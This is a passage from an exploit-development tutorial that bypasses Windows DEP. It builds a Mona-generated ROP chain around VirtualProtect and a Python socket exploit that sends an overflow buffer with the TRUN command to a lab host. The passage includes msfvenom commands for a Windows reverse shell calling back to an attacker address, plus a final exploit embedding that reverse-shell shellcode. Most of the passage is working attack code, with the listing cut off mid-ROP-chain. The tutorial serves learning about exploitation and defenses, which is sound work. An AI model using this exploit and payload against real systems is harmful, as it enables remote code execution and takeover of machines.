<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/29ca5bad13184e00bc0aa59d79e5a630.png" alt="MonaROPSearch.png"></p>
<p>For 32 bit system, the <code>rop_chains.txt</code> file is located in the following path:
<code>C:\Program Files\Immunity Inc\Immunity Debugger</code></p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/712e1238fd734accb2becc98d18e689c.png" alt="Path.png"></p>
<p>The x86 assembly code shows that the registers and stack are being set up to call the Windows API function, <a href="https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect">VirtualProtect()</a>. More information can be found on MSDN.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="c">################################################################################
</span></span></span><span class="line"><span class="cl"><span class="c"></span>
</span></span><span class="line"><span class="cl"><span class="nf">Register</span> <span class="no">setup</span> <span class="no">for</span> <span class="no">VirtualProtect</span><span class="p">()</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">--------------------------------------------</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EAX</span> <span class="err">=</span> <span class="no">NOP</span> <span class="p">(</span><span class="mi">0x90909090</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">ECX</span> <span class="err">=</span> <span class="no">lpOldProtect</span> <span class="p">(</span><span class="no">ptr</span> <span class="no">to</span> <span class="no">W</span> <span class="no">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EDX</span> <span class="err">=</span> <span class="no">NewProtect</span> <span class="p">(</span><span class="mi">0x40</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EBX</span> <span class="err">=</span> <span class="no">dwSize</span>
</span></span><span class="line"><span class="cl"> <span class="nf">ESP</span> <span class="err">=</span> <span class="no">lPAddress</span> <span class="p">(</span><span class="no">automatic</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EBP</span> <span class="err">=</span> <span class="no">ReturnTo</span> <span class="p">(</span><span class="no">ptr</span> <span class="no">to</span> <span class="no">jmp</span> <span class="no">esp</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">ESI</span> <span class="err">=</span> <span class="no">ptr</span> <span class="no">to</span> <span class="no">VirtualProtect</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EDI</span> <span class="err">=</span> <span class="no">ROP</span> <span class="no">NOP</span> <span class="p">(</span><span class="no">RETN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="err">---</span> <span class="nf">alternative</span> <span class="no">chain</span> <span class="p">---</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EAX</span> <span class="err">=</span> <span class="no">ptr</span> <span class="no">to</span> <span class="err">&amp;</span><span class="no">VirtualProtect</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"> <span class="nf">ECX</span> <span class="err">=</span> <span class="no">lpOldProtect</span> <span class="p">(</span><span class="no">ptr</span> <span class="no">to</span> <span class="no">W</span> <span class="no">address</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EDX</span> <span class="err">=</span> <span class="no">NewProtect</span> <span class="p">(</span><span class="mi">0x40</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EBX</span> <span class="err">=</span> <span class="no">dwSize</span>
</span></span><span class="line"><span class="cl"> <span class="nf">ESP</span> <span class="err">=</span> <span class="no">lPAddress</span> <span class="p">(</span><span class="no">automatic</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EBP</span> <span class="err">=</span> <span class="no">POP</span> <span class="p">(</span><span class="no">skip</span> <span class="mi">4</span> <span class="no">bytes</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="nf">ESI</span> <span class="err">=</span> <span class="no">ptr</span> <span class="no">to</span> <span class="no">JMP</span> <span class="p">[</span><span class="no">EAX</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"> <span class="nf">EDI</span> <span class="err">=</span> <span class="no">ROP</span> <span class="no">NOP</span> <span class="p">(</span><span class="no">RETN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"> <span class="err">+</span> <span class="nf">place</span> <span class="no">ptr</span> <span class="no">to</span> <span class="err">&#34;</span><span class="no">jmp</span> <span class="no">esp</span><span class="err">&#34;</span> <span class="no">on</span> <span class="no">stack</span><span class="p">,</span> <span class="no">below</span> <span class="no">PUSHAD</span>
</span></span><span class="line"><span class="cl"><span class="err">--------------------------------------------</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">ROP</span> <span class="no">Chain</span> <span class="no">for</span> <span class="no">VirtualProtect</span><span class="p">()</span> <span class="p">[(</span><span class="no">XP</span><span class="err">/</span><span class="mi">2003</span> <span class="no">Server</span> <span class="no">and</span> <span class="no">up</span><span class="p">)]</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="err">----------------------------------------------------------</span>
</span></span></code></pre></div><p>Here is the Python code Mona generated for us. Let&rsquo;s use this in our exploit</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="o">***</span> <span class="p">[</span> <span class="n">Python</span> <span class="p">]</span> <span class="o">***</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># rop chain generated with mona.py - www.corelan.be</span>
</span></span><span class="line"><span class="cl">    <span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_esi:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x76a172f0</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x6250609c</span><span class="p">,</span>  <span class="c1"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x7521fd52</span><span class="p">,</span>  <span class="c1"># MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_ebp:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x76e7c5ba</span><span class="p">,</span>  <span class="c1"># POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x625011af</span><span class="p">,</span>  <span class="c1"># &amp; jmp esp [essfunc.dll]</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_ebx:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x76a342f9</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0xfffffdff</span><span class="p">,</span>  <span class="c1"># Value to negate, will become 0x00000201</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x768a1643</span><span class="p">,</span>  <span class="c1"># NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x7521f9f1</span><span class="p">,</span>  <span class="c1"># XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_edx:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x7527ea50</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [MSCTF.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0xffffffc0</span><span class="p">,</span>  <span class="c1"># Value to negate, will become 0x00000040</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x76963193</span><span class="p">,</span>  <span class="c1"># NEG EAX # RETN [user32.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x74fa1110</span><span class="p">,</span>  <span class="c1"># XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_ecx:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x7689fb57</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x75285e78</span><span class="p">,</span>  <span class="c1"># &amp;Writable location [MSCTF.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_edi:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x76df7643</span><span class="p">,</span>  <span class="c1"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x768a1645</span><span class="p">,</span>  <span class="c1"># RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:gadgets_to_set_eax:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x758b9b4c</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c1"># nop</span>
</span></span><span class="line"><span class="cl">      <span class="c1">#[---INFO:pushad:---]</span>
</span></span><span class="line"><span class="cl">      <span class="mh">0x758ec2a0</span><span class="p">,</span>  <span class="c1"># PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR </span>
</span></span><span class="line"><span class="cl">    <span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span></span></code></pre></div><p>We need to modify the exploit to overwrite EIP with our ROP chain rather than the JMP ESP instruction and replace the C&rsquo;s with <code>\xcc</code> (breakpoint) which will allow us to hit a breakpoint right after executing our ROP chain.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Target IP address and port</span>
</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.16.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># rop chain generated with mona.py - www.corelan.be</span>
</span></span><span class="line"><span class="cl">        <span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_esi:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76a172f0</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x6250609c</span><span class="p">,</span>  <span class="c1"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7521fd52</span><span class="p">,</span>  <span class="c1"># MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_ebp:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76e7c5ba</span><span class="p">,</span>  <span class="c1"># POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x625011af</span><span class="p">,</span>  <span class="c1"># &amp; jmp esp [essfunc.dll]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_ebx:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76a342f9</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xfffffdff</span><span class="p">,</span>  <span class="c1"># Value to negate, will become 0x00000201</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x768a1643</span><span class="p">,</span>  <span class="c1"># NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7521f9f1</span><span class="p">,</span>  <span class="c1"># XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_edx:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7527ea50</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [MSCTF.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xffffffc0</span><span class="p">,</span>  <span class="c1"># Value to negate, will become 0x00000040</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76963193</span><span class="p">,</span>  <span class="c1"># NEG EAX # RETN [user32.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x74fa1110</span><span class="p">,</span>  <span class="c1"># XCHG EAX,EDX # RETN [KERNELBASE.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_ecx:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7689fb57</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [RPCRT4.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x75285e78</span><span class="p">,</span>  <span class="c1"># &amp;Writable location [MSCTF.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_edi:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76df7643</span><span class="p">,</span>  <span class="c1"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x768a1645</span><span class="p">,</span>  <span class="c1"># RETN (ROP NOP) [RPCRT4.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_eax:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x758b9b4c</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [kernel32.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x90909090</span><span class="p">,</span>  <span class="c1"># nop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:pushad:---]</span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x758ec2a0</span><span class="p">,</span>  <span class="c1"># PUSHAD # RETN [kernel32.dll] ** REBASED ** ASLR</span>
</span></span><span class="line"><span class="cl">        <span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">_</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="n">rop_gadgets</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">rop_chain</span> <span class="o">=</span> <span class="n">create_rop_chain</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#JMP ESP 0x625011AF: \xAF\x11\x50\x62</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span> <span class="o">*</span> <span class="mi">2003</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">rop_chain</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\xcc</span><span class="s2">&#34;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">3000</span><span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">RPORT</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Sending exploit!&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;TRUN /.:/&#34;</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[+] Evil buffer sent...&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;[-] Could not connect to server!&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>After modifying and sending the exploit, we hit our breakpoint after a series of \x90&rsquo;s (NOPs), which means it worked :) We execute the breakpoint that was placed on the stack. We made the stack executable!</p>
<p>You can place anything after the ROP chain, such as <code>\xcc</code>, which is a breakpoint or <code>\x90's</code> or even your shellcode.</p>
<p><img src="/Windows-User-Mode-Exploit-Development-DEP-Part-4/ad2bd7af55e746938d2cc7078f457fef.png" alt="StackExecutable.png"></p>
<p>To generate a reverse shell, you can use the following:</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.16.128 LPORT=443 EXITFUNC=thread -b '\x00' -f c</code></p>
<p>or</p>
<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.16.128 LPORT=443 EXITFUNC=thread -b '\x00' -f c</code></p>
<h2 id="final-exploit">Final exploit</h2>
<p>Here is the final exploit to pop a reverse shell. I added some memN0ps ;) before and after the shellcode. The ROP chain takes the place of our JMP ESP, we no longer require the JMP ESP</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#author memN0ps</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Target IP address and port</span>
</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;192.168.16.129&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">9999</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># msfvenom -p windows/shell_reverse_tcp LHOST=192.168.16.128 LPORT=443 EXITFUNC=thread -b &#39;\x00&#39; -f c</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="s2">&#34;</span><span class="se">\xbe\x4a\xef\xc7\xc3\xd9\xc8\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x52\x31\x72\x12\x03\x72\x12\x83\xa0\x13\x25\x36\xc8\x04\x28</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xb9\x30\xd5\x4d\x33\xd5\xe4\x4d\x27\x9e\x57\x7e\x23\xf2\x5b</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xf5\x61\xe6\xe8\x7b\xae\x09\x58\x31\x88\x24\x59\x6a\xe8\x27</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xd9\x71\x3d\x87\xe0\xb9\x30\xc6\x25\xa7\xb9\x9a\xfe\xa3\x6c</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x0a\x8a\xfe\xac\xa1\xc0\xef\xb4\x56\x90\x0e\x94\xc9\xaa\x48</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x36\xe8\x7f\xe1\x7f\xf2\x9c\xcc\x36\x89\x57\xba\xc8\x5b\xa6</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x43\x66\xa2\x06\xb6\x76\xe3\xa1\x29\x0d\x1d\xd2\xd4\x16\xda</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xa8\x02\x92\xf8\x0b\xc0\x04\x24\xad\x05\xd2\xaf\xa1\xe2\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xf7\xa5\xf5\x75\x8c\xd2\x7e\x78\x42\x53\xc4\x5f\x46\x3f\x9e</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xfe\xdf\xe5\x71\xfe\x3f\x46\x2d\x5a\x34\x6b\x3a\xd7\x17\xe4</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x8f\xda\xa7\xf4\x87\x6d\xd4\xc6\x08\xc6\x72\x6b\xc0\xc0\x85</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x8c\xfb\xb5\x19\x73\x04\xc6\x30\xb0\x50\x96\x2a\x11\xd9\x7d</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xaa\x9e\x0c\xd1\xfa\x30\xff\x92\xaa\xf0\xaf\x7a\xa0\xfe\x90</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x9b\xcb\xd4\xb8\x36\x36\xbf\x06\x6e\x28\xbf\xef\x6d\x48\xbe</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x54\xf8\xae\xaa\xba\xad\x79\x43\x22\xf4\xf1\xf2\xab\x22\x7c</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x34\x27\xc1\x81\xfb\xc0\xac\x91\x6c\x21\xfb\xcb\x3b\x3e\xd1</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x63\xa7\xad\xbe\x73\xae\xcd\x68\x24\xe7\x20\x61\xa0\x15\x1a</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xdb\xd6\xe7\xfa\x24\x52\x3c\x3f\xaa\x5b\xb1\x7b\x88\x4b\x0f</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x83\x94\x3f\xdf\xd2\x42\xe9\x99\x8c\x24\x43\x70\x62\xef\x03</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x05\x48\x30\x55\x0a\x85\xc6\xb9\xbb\x70\x9f\xc6\x74\x15\x17</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\xbf\x68\x85\xd8\x6a\x29\xa5\x3a\xbe\x44\x4e\xe3\x2b\xe5\x13</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x14\x86\x2a\x2a\x97\x22\xd3\xc9\x87\x47\xd6\x96\x0f\xb4\xaa</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\x87\xe5\xba\x19\xa7\x2f</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_rop_chain</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">        <span class="c1"># rop chain generated with mona.py - www.corelan.be</span>
</span></span><span class="line"><span class="cl">        <span class="n">rop_gadgets</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_esi:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76a172f0</span><span class="p">,</span>  <span class="c1"># POP ECX # RETN [msvcrt.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                      </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x6250609c</span><span class="p">,</span>  <span class="c1"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]                                                                                                                                                                                                                                                          </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7521fd52</span><span class="p">,</span>  <span class="c1"># MOV ESI,DWORD PTR DS:[ECX] # ADD DH,DH # RETN [MSCTF.dll] ** REBASED ** ASLR                                                                                                                                                                                                                        </span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_ebp:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76e7c5ba</span><span class="p">,</span>  <span class="c1"># POP EBP # RETN [ntdll.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                       </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x625011af</span><span class="p">,</span>  <span class="c1"># &amp; jmp esp [essfunc.dll]                                                                                                                                                                                                                                                                             </span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_ebx:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x76a342f9</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [msvcrt.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                      </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xfffffdff</span><span class="p">,</span>  <span class="c1"># Value to negate, will become 0x00000201                                                                                                                                                                                                                                                             </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x768a1643</span><span class="p">,</span>  <span class="c1"># NEG EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                      </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7521f9f1</span><span class="p">,</span>  <span class="c1"># XCHG EAX,EBX # RETN [MSCTF.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">                                                                                                                                                                                                                                                                                                                           
</span></span><span class="line"><span class="cl">        <span class="c1">#[---INFO:gadgets_to_set_edx:---]                                                                                                                                                                                                                                                                                  </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0x7527ea50</span><span class="p">,</span>  <span class="c1"># POP EAX # RETN [MSCTF.dll] ** REBASED ** ASLR                                                                                                                                                                                                                                                       </span>
</span></span><span class="line"><span class="cl">        <span class="mh">0xffffffc0</span><span class="p">,</span>  <span class="c1"># Value to negate, will become 0x00000040                                                                                                                                                                                                                                                             </span>
